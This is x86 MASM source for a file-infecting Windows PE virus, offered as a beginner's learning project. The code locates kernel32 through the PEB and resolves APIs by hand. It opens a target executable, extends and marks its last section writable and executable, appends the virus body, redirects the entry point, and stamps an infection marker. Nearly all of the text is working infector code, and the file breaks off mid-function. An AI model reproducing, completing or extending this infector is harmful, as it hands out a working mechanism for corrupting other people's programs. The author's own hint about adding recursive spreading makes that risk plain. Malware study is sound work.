;========================================================
; Author: 		VietMV (Mai Van Viet)
; Contact: If you have any question about this program, you can contact to me with: 
; 		Medium:		https://medium.com/@vietmv
; 		Facebook:	https://www.facebook.com/profile.php?id=100001795912780
;		Email:		vietmv2703@gmail.com
;		Github:		https://github.com/VietMV
;
; Description:	Simple Virus inject into Exe File (PE File) For Learning so it isn't dangerous for any computer and any user.
;
; Virus Feature:
;	+ Inject virus code into exe File (PE File). Virus can inject into any DLL File. The  infection mechanism inject into DLL (Dynamic Link Library) is the same. 
;		But I want to keep Virus Simplest for Beginners easy to learning. In this case, My virus will inject into file name ("Example.exe") in the same folder with virus. 
;		You can config any exe file if you want by set full path file in  szTargetFile variable.
;	+ Recursive Injection: No. Because I want to keep Virus Simplest. You can coding and implement more by call Window API such as: FindFirstFile, FindNextFile, etc,.
;	+ Flatform: x86 - 32bit
;	+ Windows Version: XP, Vista, 7, 8, 10
;
; Remark: 
; I want to keep Virus Simplest for Beginners easy to learning so:
;	+ This virus can't inject all PE File and virus can error when inject some special exe file such as: DLL file, sys file,  setup program, file exe have Relocation, etc,.
;		.... In my case, I use notepad.exe for testing virus feature. I copy notepad.exe from C:\windows\ to folder of virus program and rename "notepad.exe" to "Example.exe"
;	
; If you are beginner and you don't understand any things about my virus code. It's normal things :). 
;		Because, 6 year ago,  when i was a beginner, I like you. I also didn't understand any things and i was stressed however I had many supporting by seniors such as KhanhVD (Vo Duy Khanh), HoangNVc (Ngo Van Hoang), DatPM (Pham Minh Dat), AnhNN (Nguyen Ngoc Anh), TuanTNb (Trinh Nhat Tuan) etc,. (Tks Bros <3). 
;		So don't worry about any things. I will write some blog on medium and explain step by step for you. :)
;========================================================

;===================Develop Environment====================
; Complier: 	Masm 	- http://www.masm32.com/
; Editor: 		Winasm	- http://www.winasm.net/
; Debugger: 	OllyDbg 	- http://www.ollydbg.de/
; OS:			Windows XP. You can develop in Win Vista, 7, 8, 10
; PE Viewer:	CFF Explorer - Ntcore - http://www.ntcore.com/exsuite.php
;========================================================

;======================= Reference ========================
; Windows API Documents: 
;	+ msdn.microsoft.com
; PE Tutorial: 	
;	+ http://www.darkblue.ch/programming/PE_Format.pdf
;	+ http://win32assembly.programminghorizon.com
; Delta + Get kernel32 base: 
;	+ http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table
; Basic Assembly Language: 
;	+ "Lap Trinh Hop Ngu Va May Vi Tinh IBM PC - Quach Tuan Ngoc" - Vietnamese Language
;==========================================================

.386
.MODEL flat, stdcall
OPTION CASEMAP:NONE 
Include windows.inc
Include kernel32.inc
Include masm32.inc
IncludeLib kernel32.lib
IncludeLib masm32.lib

ASSUME FS:NOTHING											; Enable FS Register Access

.code
Start:														; Main Function of Virus

	StartVirus:												; Start Virus
	
	; Calculate Delta Offset
	call DeltaLabel
	DeltaLabel:
	pop eax
	sub eax, DeltaLabel
	
	pushad													; Backup All Registers into Stack
	mov ebp, eax												; ebp save Delta value
	
	; Get Image Base Of Kernel32.dll
	call GetImageBaseOfKernel32_DLL
	
	; Get Adress of "LoadLibraryA" Function from  Kernel32.dll
	lea edx, [szLoadLibraryA + ebp]
	mov ecx, [dwLenOfStrLoadLibrary + ebp]
	call GetFunctionAddressInKernel32
	mov [dwFnLoadLibraryA + ebp ], eax
	
	; Get Address of "GetProcAddress" Function from  Kernel32.dll
	lea edx, [szGetProcAddress + ebp]
	mov ecx, [dwLenOfStrGetProcessAddress + ebp]
	call GetFunctionAddressInKernel32
	mov [dwFnGetProcAddress + ebp ], eax
	
	; Get All Function need to fix and inject virus
	call GetAllWindowAPI
	
	; Open File
	lea ebx, [szTargetFile + ebp]
	call FnOpenFile
	mov [dwhFileTarget + ebp], eax
	
	; Checking File is PE File
	call IsPeFile
	cmp eax, 1
	jne EndInjectionVirus
	
	; Checking File is Injected Virus
	call IsVirusInjected
	cmp eax, 1
	je EndInjectionVirus									
	
	; Add New Virus Section Header
	call ExtendLastSectionHeaderForVirus
	
	; Write Virus In The End Of File
	call WriteVirus
	
	; Fix Optional Header: AddressOfEntryPoint, SizeOfImage, Write Virus Signature 
	call FixPeHeader
	
EndInjectionVirus:

	; Close File And Finish
	push [dwhFileTarget + ebp]
	call [dwFnCloseHanle + ebp]							; <=> CloseHandle(dwhFileTarget)
	
	;Show MessageBox  Virus Message
	call ShowVirusMessage
	
	
	; Get Virtual Address EntryPoint Of MainProgram
	call GetEntryPointOfMainProgram
	
	popad											; Restore Register Form Stack
	
	mov eax, [dwVAEntryPointOfMainProgram + eax]
	jmp eax											; Jump to Main Program
	
	
retn	; End  Main Function of Virus


;========================================
; Function Name: GetImageBaseOfKernel32_DLL
; Description: Get Image Base Of kernel32.dll in memory of process injected
; Parameter: Void
; return: Image Base Of Kernel32.dll library is Stored into eax register and dwKernelBase variable
;========================================

GetImageBaseOfKernel32_DLL:
	mov eax, [FS : 30h]  			; get a pointer to the PEB
	mov eax, [eax + 0Ch] 		 ; get PEB->Ldr
	mov eax, [eax + 14h]  		; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	mov eax, [eax]   			; 2nd Entry
	mov eax, [eax]   			; 3rd Entry
	mov eax, [eax + 10h]  		; Get Kernel32 Base
	
	mov [dwKernelBase + ebp], eax
ret




;======================================
; Function Name: 	GetFunctionAddress
; Description: 		Get Function Address By Name in Kernel32.dll Library
; Parameters: 		edx store Name Of Function
;				ecx store Length of Name Function
; Return: 			eax store address of function
;=======================================

GetFunctionAddressInKernel32:
     	
     	push ebx									; Backup ebx Register into Stack Memory							
     	push edi									; Backup edi Register into Stack Memory	
     	push esi									; Backup esi Register into Stack Memory	
     	
     	mov [dwFunctionName + ebp], edx
     	mov [dwLenOfFuntionName + ebp], ecx
     	
     	; Get Address Of Export Directory Table
     	mov ebx,  [dwKernelBase + ebp]
     	add ebx, 160h								; Jump to Export Directory
     	mov ebx, [ebx]								; Get RVA of Export Table
    	add ebx, [dwKernelBase + ebp]				; Get VA of Export Table
     	mov [dwExportTableVA + ebp], ebx				; Store VA of Export Table to dwExportTableAV variable
     	
     	mov ecx, [ebx + 1Ch ]						; Get RVA Address of Array  AddressOfFunctions
     	add ecx, [dwKernelBase + ebp]				; Get VA Address of Array AddressOfFunctions
     	mov [dwArrAddrOfFunctions + ebp], ecx			; Store VA Address of Array AddressOfFunctions into dwArrAddrOfFunctions variable
     	
     	mov ecx, [ebx + 20h ]						; Get RVA Address of Array dwArrAddrOfNames
     	add ecx, [dwKernelBase + ebp]				; Get Get VA Address of Array dwArrAddrOfNames
     	mov [dwArrAddrOfNames + ebp], ecx			; Store VA Address of Array dwArrAddrOfNames into dwArrAddrOfNames variable
     	
     	mov ecx, [ebx + 24h ]						; Get RVA Address of Array dwArrAddrOfNames
     	add ecx, [dwKernelBase + ebp]				; Get Get VA Address of Array dwArrAddrOfNames
     	mov [dwArrAddrOfNameOdinals + ebp], ecx		; Store VA Address of Array dwArrAddrOfNames into dwArrAddrOfNames variable
     	
	; Get Number Of Function in Kernel32.dll
	
	mov ecx, [ebx + 18h ]					; Get Number Of Function in Kernel32.dll
	mov [dwNumberOfNameFunction + ebp], ecx	; Get Number Of Function in Kernel32.dll
	
	mov ecx, 0							; ecx is index of list function export
	mov ebx,  [dwKernelBase + ebp]
	
LoopNumberOfFunction:
	
	; Get String Of Export Function
	mov esi, [dwFunctionName + ebp]
	
	mov eax, 4
	mul ecx
	
	mov edi, [dwArrAddrOfNames + ebp]
	add edi, eax
	
	mov edi, [edi]
	add edi, ebx
	
	; Compare Address Of Name
	CLD
	push ecx
	mov ecx,  [dwLenOfFuntionName + ebp]
	repe cmpsb
	pop ecx
	jne ContinueLoop
	
	; Get Name Ordinals
	
	mov eax, 2
	mul ecx
	mov edx, [dwArrAddrOfNameOdinals + ebp]
	add edx, eax
	mov ecx, 0
	mov cx,  WORD PTR [edx]
	
	
	; Get Address => Store In eax register
	mov eax, 4	
	mul ecx
	mov edx, [dwArrAddrOfFunctions + ebp]
	add edx, eax
	mov eax, [edx]
	add eax, ebx

	jmp ExitFunction
	
	
ContinueLoop:
	inc ecx								; ecx = ecx - 1
	cmp ecx, 0h							; Compare ecx with 0
	jne LoopNumberOfFunction				; If ecx > 0 then jump to LoopNumberOfFunction
	
	mov eax, 0
	jmp ExitFunction
     	
     	ExitFunction:
     		
     	pop esi								; Restore esi Register from Stack Memory	
     	pop edi								; Restore edi Register from Stack Memory	
        	pop ebx								; Restore ebx Register from Stack Memory	
 ret										; End GetFunctionAddressInKernel32 Function
       
 ;==================================
 ; Function Name: 	GetAddrAPIByName
 ; Description: 		Load Library And Get Address Of API By Name
 ; Parameter: 		esi - Store Name Of Library
 ;				edi - Store Name Of API
 ; Return: 			eax - Store Address Of API.
 ;==================================
 
 GetAddrAPIByName:
 
 	push esi						; Push Name Of Library into Stack <=> szNameOfLibrary = ecx
 	call [dwFnLoadLibraryA + ebp]		; Call API LoadLibraryA <=> eax = LoadLibrary(szNameOfLibrary);
 	
 	push edi						;	hMobule 			= ecx
 	push eax						;	lpszProcName		= eax
 	call [dwFnGetProcAddress + ebp]	;	<=> eax = GetProcAddress(hMobule, lpszProcName); 	
 ret								; End GetAddrAPIByName Function
 
  ;==================================
 ; Function Name: 	GetAllWindowAPI
 ; Description: 		Get All Window API for Malware Feature
 ; Parameter: 		void
 ; Return: 			void
 ;==================================
 
GetAllWindowAPI:

	push esi
	push edi
	
	; Get Address Of API CreateFileA
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szCreateFileA + ebp]
	call GetAddrAPIByName
	mov [dwFnCreateFileA + ebp], eax
	
	; Get Address Of API ReadFile
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szReadFile + ebp]
	call GetAddrAPIByName
	mov [dwFnReadFile + ebp], eax
	
	; Get Address Of API WriteFile
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szWriteFile + ebp]
	call GetAddrAPIByName
	mov [dwFnWriteFile + ebp], eax
	
	; Get Address Of API CloseFile
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szCloseFile + ebp]
	call GetAddrAPIByName
	mov [dwFnCloseHanle + ebp], eax
	
	; Get Address Of API SetFilePointer
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szSetFilePointer + ebp]
	call GetAddrAPIByName
	mov [dwFnSetFilePointer + ebp], eax
	
	; Get Address Of API GetFileSizeEx
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szGetFileSizeEx + ebp]
	call GetAddrAPIByName
	mov [dwFnGetFileSizeEx + ebp], eax
	
	; Get Address Of API GetModuleHandleA
	lea esi, [szKernel32DLL + ebp]
	lea edi, [szGetModuleHandle + ebp]
	call GetAddrAPIByName
	mov [dwFnGetModuleHandle + ebp], eax
	
	; Get Address Of API MessageBoxA
	lea esi, [szUser32DLL + ebp]
	lea edi, [szMessageBox + ebp]
	call GetAddrAPIByName
	mov [dwFnMessageBox + ebp], eax
	
	pop edi
	pop esi
ret
        
;===================================
;Function Name: 	FnOpenFile
;Description:		Open File
;Parameter: 		ebx - Store Path File Target
;Return:			eax - Store Handle of File Target
;===================================
FnOpenFile:
	push 0						; hTemplateFile 		= 0
	push 0						; dwFlagsAndAttributes 	= 0
	push 3						; dwCreationDisposition	= OPEN_EXISTING = 3
	push 0						; lpSecurityAttributes		= 0
	push 1						; dwShareMode		= FILE_SHARE_READ	= 0x00000001
	push 0C0000000h				; dwDesiredAccess		= GENERIC_READ | GENERIC_WRITE = 0x80000000 | 0x40000000 = 0xC0000000
	push ebx						; lpFileName			= ebx
	call [dwFnCreateFileA + ebp]		; <=> eax = CreateFile(lpFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
ret								; End FnOpenFile Function

;========================================
; Function Name: IsPeFile
; Description: Check and Validate PE File
; Parameter: Void
; return: If file isn't file PE and file is invalid PE File then return eax = 0, If File is PE File and PE File is Valid then return eax = 1
;========================================

IsPeFile:

	push ebx
	; Read 0x400 Byte Begin Of File
	call ReadPEHeader
	cmp eax, 1
	jne InvalidPEFile
	
	; Check MZ Signature
	cmp WORD PTR [pbPEHeaderBuffer + ebp], 5A4Dh		; 0x5A4D = MZ
	jne InvalidPEFile
	
	; Check PE Signature
	lea ebx, [pbPEHeaderBuffer + ebp]						;
	add ebx, 3Ch										;
	
	mov ebx, [ebx]
	mov [dwPEOffset + ebp], ebx							;=> Jump To Offset Of PE Signature
	lea ebx, [pbPEHeaderBuffer + ebp]						;
	add [dwPEOffset + ebp], ebx 							;
	
	mov ebx, [dwPEOffset + ebp]
	cmp WORD PTR [ebx], 4550h							; 4550h = PE
	jne InvalidPEFile
	
	mov eax, 1
	jmp EndIsPeFile
InvalidPEFile:
	mov eax, 0
	
EndIsPeFile:
	pop ebx

ret													; End IsPeFile Function

;========================================
; Function Name: ReadPEHeader
; Description: Read PE Header From File Host
; Parameter: Void
; return: void
;========================================

ReadPEHeader:

	push ebx
	
	;Check File Size > 1024 byte = 0x400
	lea ebx, dwFileSizeLow
	add ebx, ebp
	push ebx
	push [dwhFileTarget + ebp]
	call [dwFnGetFileSizeEx + ebp]
	
	cmp [dwFileSizeLow + ebp], 400h
	jnge ReadFileError
	
	; Check MZ and PE Signature
	
	push 0								;lpOverlapped = NULL = 0
	lea ebx , [dwNumberReaded + ebp]			; 
	push ebx								;lpNumberOfBytesRead = address of dwNumberReaded variable
	push 400h							;nNumberOfBytesToRead = 0x400 = 1024 Byte
	lea ebx, [pbPEHeaderBuffer + ebp]			; 
	push ebx								;lpBuffer = pbPEHeaderBuffer
	push [dwhFileTarget + ebp]				;hFile = dwhFileTarget
	call [dwFnReadFile + ebp]				; <=> ReadFile(dwhFileTarget, pbPEHeaderBuffer, 400, &dwNumberReaded, 0)
	
	cmp eax, 1
	jne ReadFileError
	
	mov eax, 1
	jmp EndReadPEHeader
	
ReadFileError:
	mov eax, 0
	
EndReadPEHeader:
	pop ebx

ret										; End ReadPEHeader Function

;========================================
; Function Name: IsVirusInjected
; Description: Check File Host is Injected  Virus
; Parameter: void
; return: If File is Inject Virus then eax = 1. else eax = 0
;========================================
IsVirusInjected:

	push ebx								; Backup Value of ebx Register into Stack Memory
	
	mov ebx, [dwPEOffset + ebp]
	add ebx, 8							; Goto TimeDateStamp Record
	
	mov ebx, [ebx]							; Get TimeDateStamp Value
	
	cmp ebx,  [dwVirusSignature + ebp]			; Check TimeDateStamp Value == 0x73726956 = "Virs"
	jne VirusNotInjected
	
	mov eax, 1							; File Host Is Injected Virus => Set eax = 1
	jmp EndIsVirusInjected
VirusNotInjected:
	mov eax, 0							; File Host Isn't Injected Virus => Set eax = 0
	
EndIsVirusInjected:
	pop ebx								; Restore Value of ebx Register from Stack Memorys

ret										; End IsVirusInjected Function

;========================================
; Function Name: ExtendLastSectionHeaderForVirus
; Description: Extend Last Section for inject virus
; Parameter: void
; return: void
;========================================
ExtendLastSectionHeaderForVirus:

	call GetLastSectionInfo						; Get Data Of Last Section Header
	
	call ExtendLastSectionForStorageVirus			; Calculate New VirtualSize, RawSize Of Last Section
	
	call WriteSectionHeader						; Write New VirutalSize, RawSize and Chracteristic of Last Section after Extend
	
ret											;End ExtendLastSectionHeaderForVirus Function

GetLastSectionInfo:
	push ebx
	push ecx
	push eax
	push edx
	
	; Get Number Of Section
	mov ebx, [dwPEOffset + ebp]
	add ebx, 6									; Jump To NumberOfSection
	mov ax, WORD PTR [ebx]	
	mov [wNumberOfSection + ebp], ax	
	; Jump To Section Table
	mov ebx, [dwPEOffset + ebp]
	add ebx, 0F8h									; Jump To SectionTable
	mov [dwOffsetOfSectionTable + ebp], ebx			; Store Offset Of SectionTable
	
	;  Jump Last Section
	mov eax, 28h									; 28h = Size of a Section Record
	mov ecx, 0
	mov cx, WORD PTR [wNumberOfSection + ebp]
	sub ecx, 1
	mul ecx
	add eax, ebx
	mov [dwOffsetLastSection + ebp], eax
	
	; Get Virtual Size Of Last Section
	add eax, 8
	mov ebx, [eax]
	mov [dwVirtualSizeOfLastSection + ebp], ebx
	
	; Get Virutal Address Of Last Section
	add eax, 4
	mov ebx, [eax]
	mov [dwVirtualAddressOfLastSection + ebp], ebx
	
	;Get Raw Size Of Last Section
	add eax, 4
	mov ebx, [eax]
	mov [dwRawSizeOfLastSection + ebp], ebx
	
	;Get Raw Address Of Last Section
	add eax, 4
	mov ebx, [eax]
	mov [dwRawAddressOfLastSection + ebp], ebx
	
	; Get Characteristic Of Last Section
	add eax, 10h
	mov ebx, [eax]
	mov [dwVirusCharacteristics + ebp], ebx
	
	pop edx
	pop eax
	pop ecx
	pop ebx
ret

ExtendLastSectionForStorageVirus:
	push eax
	push ebx
	push ecx
	push edx
	
	; Calculate Virus Size
	lea eax, EndVirus
	lea edx, StartVirus
	sub eax, edx
	mov [dwVirusSize + ebp], eax
	
	; Extend New VirtualSize Of Last Section 
	mov edx, 0
	mov eax, [dwVirtualSizeOfLastSection + ebp]
	add eax, [dwVirusSize + ebp]
	
	mov ecx, 1000h
	div  ecx
	
	cmp edx, 0
	je CalcNewVirtualSizeOfLastSection
	add eax, 1
CalcNewVirtualSizeOfLastSection:
	mov edx, 0
	mov ecx, 1000h
	mul ecx
	mov [dwVirusVirtualSize + ebp], eax					;NewVirtualAddressOfLastSection is Saved into dwVirusVirtualAddress
	
	; Extend New RawSize Of Last Section
	mov edx, 0
	mov eax, [dwRawSizeOfLastSection + ebp]
	add eax, [dwVirusSize + ebp]
	mov ecx, 200h
	div  ecx
	cmp edx, 0
	je CalcNewRawSizeOfLastSection
	add eax, 1
CalcNewRawSizeOfLastSection:
	mov edx, 0
	mov ecx, 200h
	mul ecx
	mov [dwVirusRawSize + ebp], eax					;NewRawSizeOfLastSection is Saved into dwVirusRawSize
	
	pop edx
	pop ecx
	pop ebx
	pop eax
ret

WriteNewVirtualSizeOfLastSection:
	push eax
	push ebx
	
	lea ebx, pbPEHeaderBuffer
	add ebx, ebp
	mov eax, [dwOffsetLastSection + ebp]
	add eax, 8
	sub eax, ebx
	
	;Set File Point to Offset VirtualSize Of Last Section
	push 0								; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0								; lpDistanceToMoveHigh 	= NULL 		= 0
	push eax								; lDistanceToMove		= Offset VirtualSize Of Last Section
	push [dwhFileTarget + ebp]				;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			; <=> SetFilePointer(dwhFileTarget, lDistanceToMove, NULL, NULL, FILE_BEGIN)
	
	; Write New Virtual Size Of Last Section
	push 0								;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 4								; nNumberOfBytesToWrite	= Size of Virutal Size = 0x4 Byte
	lea ebx, [dwVirusVirtualSize + ebp]			;---\
	push ebx								;----\	lpBuffer				= &dwVirusVirtualAddress
	push [dwhFileTarget + ebp]				;hFile					= dwhFileTarget
	call [dwFnWriteFile + ebp]				; Window API: WriteFile = dwFnWriteFile <=> WriteFile(dwhFileTarget, &dwVirusVirtualSize, 0x4, &dwNumberOfBytesWritten, 0)
	
	
	pop ebx
	pop eax
ret

WriteNewRawSizeOfLastSection:
	push eax
	push ebx
	
	lea ebx, pbPEHeaderBuffer
	add ebx, ebp
	mov eax, [dwOffsetLastSection + ebp]
	add eax, 10h
	sub eax, ebx
	
	;Set File Point to Offset RawSize Of Last Section
	push 0								; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0								; lpDistanceToMoveHigh 	= NULL 		= 0
	push eax								; lDistanceToMove		= Offset RawSize Of Last Section
	push [dwhFileTarget + ebp]				;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			; <=> SetFilePointer(dwhFileTarget, lDistanceToMove, NULL, NULL, FILE_BEGIN)
	
	; Write New Virtual Size Of Last Section
	push 0								;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 4								; nNumberOfBytesToWrite	= Size of Virutal Size = 0x4 Byte
	lea ebx, [dwVirusRawSize + ebp]			;---\
	push ebx								;----\	lpBuffer				= &dwVirusRawSize
	push [dwhFileTarget + ebp]				;hFile					= dwhFileTarget
	call [dwFnWriteFile + ebp]				; Window API: WriteFile = dwFnWriteFile <=> WriteFile(dwhFileTarget, &dwVirusRawSize, 0x4, &dwNumberOfBytesWritten, 0)
	
	
	pop ebx
	pop eax
ret

FixCharacteristicOfLastSection:
	push eax
	push ebx
	
	; Calculate New Characteristic Of Last Section
	mov ebx, [dwVirusCharacteristics + ebp]
	or ebx, 20000000h							; Set Executable Flag 	= 0x20000000
	or ebx, 80000000h							; Set Writeable Flag 		= 0x80000000
	mov [dwVirusCharacteristics + ebp], ebx
	
	lea ebx, pbPEHeaderBuffer
	add ebx, ebp
	mov eax, [dwOffsetLastSection + ebp]
	add eax, 24h
	sub eax, ebx
	
	;Set File Point to Offset RawSize Of Last Section
	push 0								; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0								; lpDistanceToMoveHigh 	= NULL 		= 0
	push eax								; lDistanceToMove		= Offset Characteristics Of Last Section
	push [dwhFileTarget + ebp]				;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			; <=> SetFilePointer(dwhFileTarget, lDistanceToMove, NULL, NULL, FILE_BEGIN)
	
	; Write New Virtual Size Of Last Section
	push 0								;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 4								; nNumberOfBytesToWrite	= Size of Virutal Size = 0x4 Byte
	lea ebx, [dwVirusCharacteristics + ebp]		;---\
	push ebx								;----\	lpBuffer				= &dwVirusCharacteristics
	push [dwhFileTarget + ebp]				;hFile					= dwhFileTarget
	call [dwFnWriteFile + ebp]				; Window API: WriteFile = dwFnWriteFile <=> WriteFile(dwhFileTarget, &dwVirusCharacteristics, 0x4, &dwNumberOfBytesWritten, 0)
	
	pop ebx
	pop eax
ret


WriteSectionHeader:
	call WriteNewVirtualSizeOfLastSection
	call WriteNewRawSizeOfLastSection
	call FixCharacteristicOfLastSection
ret

WriteVirus:

	push ebx
	push eax
	push ecx
	
	; Set File Pointer to End File
	
	mov ebx, [dwRawAddressOfLastSection + ebp]
	add ebx, [dwRawSizeOfLastSection + ebp]
	
	push 0								; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0								; lpDistanceToMoveHigh 	= NULL 		= 0
	push ebx								; lDistanceToMove		= dwRawAddressOfLastSection +  dwRawSizeOfLastSection
	push [dwhFileTarget + ebp]				;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			; <=> SetFilePointer(dwhFileTarget, NULL, NULL, NULL, FILE_BEGIN)
	
	; Write Virus in to Target File
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push 0								;lpOverlapped				= NULL = 0
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push [dwVirusSize + ebp]					;nNumberOfBytesToWrite		= Size of Virus = EndVirus - StartVirus 
	lea ebx, StartVirus
	add ebx, ebp
	push ebx								;lpBuffer					= StartVirus Lable
	push [dwhFileTarget + ebp]				;hFile	
	call [dwFnWriteFile + ebp]				; <=> WriteFile(dwhFileTarget, StartVirus, &dwNumberOfBytesWritten, dwVirusSize, NULL)
	
	; Write Padding Data
	mov ecx, [dwVirusRawSize + ebp]
	mov ebx, [dwRawSizeOfLastSection + ebp]
	sub ecx, ebx
	
	mov ebx, [dwVirusSize + ebp]
	sub ecx, ebx
	
PaddingLoop:
	
	push ecx
	
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push 0								;lpOverlapped				= NULL = 0
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 1								;nNumberOfBytesToWrite		= 1
	lea ebx, [Padding + ebp]
	push ebx								;lpBuffer					= Padding
	push [dwhFileTarget + ebp]				;hFile	
	call [dwFnWriteFile + ebp]				; <=> WriteFile(dwhFileTarget, Padding, &dwNumberOfBytesWritten, 1, NULL)
	
	pop ecx
	sub ecx, 1
	cmp ecx, 0
	jne PaddingLoop
	
	pop ecx
	pop eax
	pop ebx

ret

; Fix Optional Header: AddressOfEntryPoint, SizeOfImage, Write Virus Signature 
FixPeHeader:
	call FixAddressOfEntryPoint
	call FixSizeOfImage
	call WriteVirusSignature

ret

FixAddressOfEntryPoint:
	push eax
	push ebx
	;Back Up Original AddressOfEntryPoint to CheckSum Of File Target
	;Read Original Entrypoint
	mov ebx, [dwPEOffset + ebp]
	add ebx, 28h
	mov eax, [ebx]
	mov [dwOriginalEntryPoint + ebp], eax
	
	; Calculate Offset OriginalEntryPointOffset of Target File 
	lea eax, pbPEHeaderBuffer
	add eax, ebp
	sub ebx, eax
	mov [dwOriginalEntryPointOffset + ebp], ebx
	
	; Calculate Offset CheckSum of Target File 
	mov ebx, [dwPEOffset + ebp]
	add ebx, 58h
	sub ebx, eax
	mov [dwCheckSumOffset + ebp], ebx
	
	; Set File Pointer to CheckSum
	push 0								; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0								; lpDistanceToMoveHigh 	= NULL 		= 0
	push [dwCheckSumOffset + ebp]			; lDistanceToMove		= NULL		= 0
	push [dwhFileTarget + ebp]				;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			; <=> SetFilePointer(dwhFileTarget, dwCheckSumOffset, NULL, FILE_BEGIN)
	
	;Backup Original EntryPoint into CheckSum
	push 0								;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 4								;nNumberOfBytesToWrite		= Size of DWORD = 4 Byte 
	lea ebx, [dwOriginalEntryPoint + ebp]		;---\
	push ebx								;----\lpBuffer					= StartVirus Lable
	push [dwhFileTarget + ebp]				;hFile	
	call [dwFnWriteFile + ebp]				; <=> WriteFile(dwhFileTarget, &dwOriginalEntryPoint, &dwNumberOfBytesWritten, 4, NULL)
	
	
	; Set File Pointer to OriginalEntryPointOffset
	push 0								; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0								; lpDistanceToMoveHigh 	= NULL 		= 0
	push [dwOriginalEntryPointOffset + ebp]		; lDistanceToMove		= NULL		= 0
	push [dwhFileTarget + ebp]				;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			; <=> SetFilePointer(dwhFileTarget, dwOriginalEntryPointOffset, NULL, FILE_BEGIN)
	
	; Calculate EntryPointOfVirus
	mov ebx, [dwRawSizeOfLastSection + ebp]
	add ebx, [dwVirtualAddressOfLastSection + ebp]
	mov [dwVirusEntryPoint + ebp], ebx
	
	;Write AddressOfEntryPoint of Vrrus To AddressOfEntryPoint of File Target
	push 0								;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]	;---\
	push ebx								;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 4								;nNumberOfBytesToWrite		= Size of DWORD = 4 Byte 
	lea ebx, [dwVirusEntryPoint + ebp]			;---\
	push ebx								;----\lpBuffer				= EntryPoint Of Virus = dwVirusVirtualAddress
	push [dwhFileTarget + ebp]				;hFile	
	call [dwFnWriteFile + ebp]				; <=> WriteFile(dwhFileTarget, &dwVirusEntryPoint, &dwNumberOfBytesWritten, 4, NULL)
	
	pop ebx
	pop eax
ret

FixSizeOfImage:
	push eax
	push ebx
	
	; Calculate Offset SizeOfImage of Target File 
	mov eax, [dwPEOffset + ebp]
	add eax, 50h
	lea ebx, pbPEHeaderBuffer
	add ebx, ebp
	sub eax, ebx
	
	; Set File Pointer to SizeOfImage
	push 0										; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0										; lpDistanceToMoveHigh 	= NULL 		= 0
	push eax										; lDistanceToMove		= Offset SizeOfImage of Target File 		= eax
	push [dwhFileTarget + ebp]						;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]					
	
	; Calculate New SizeOfImage
	mov eax, [dwVirtualAddressOfLastSection + ebp]		;----\
	add eax, [dwVirusVirtualSize + ebp]					;-----\ New SizeOfImage = dwVirusVirtualAddress + dwVirusVirtualSize
	mov [dwNewSizeOfImage + ebp], eax
	
	; Write New SizeOfImage
	push 0										;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]			;---\
	push ebx										;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
	push 4										;nNumberOfBytesToWrite		= Size of DWORD = 4 Byte 
	lea ebx, [dwNewSizeOfImage + ebp]				;---\
	push ebx										;----\lpBuffer				= EntryPoint Of Virus = dwVirusVirtualAddress
	push [dwhFileTarget + ebp]						;hFile	
	call [dwFnWriteFile + ebp]						
	
	pop ebx
	pop eax
ret



WriteVirusSignature:
	push eax
	push ebx
	
	; Calculate Offset of TimeDateOfStamp of Target File 
	mov eax, [dwPEOffset + ebp]
	add eax, 8
	lea ebx, pbPEHeaderBuffer
	add ebx, ebp
	sub eax, ebx
	
	; Set File Pointer to Offset of TimeDateOfStamp
	push 0										; dwMoveMethod 		= FILE_BEGIN 	= 0
	push 0										; lpDistanceToMoveHigh 	= NULL 		= 0
	push eax										; lDistanceToMove		= Offset SizeOfImage of Target File 		= eax
	push [dwhFileTarget + ebp]						;hFile				= dwhFileTarget
	call [dwFnSetFilePointer + ebp]			

	; Write VirusSignature to TimeDateOfStamp
	push 0										;lpOverlapped				= NULL = 0
	lea ebx, [dwNumberOfBytesWritten + ebp]			;---\
	push ebx										;----\ lpNumberOfBytesWritten 	= &dwNumberOfBytesWritten
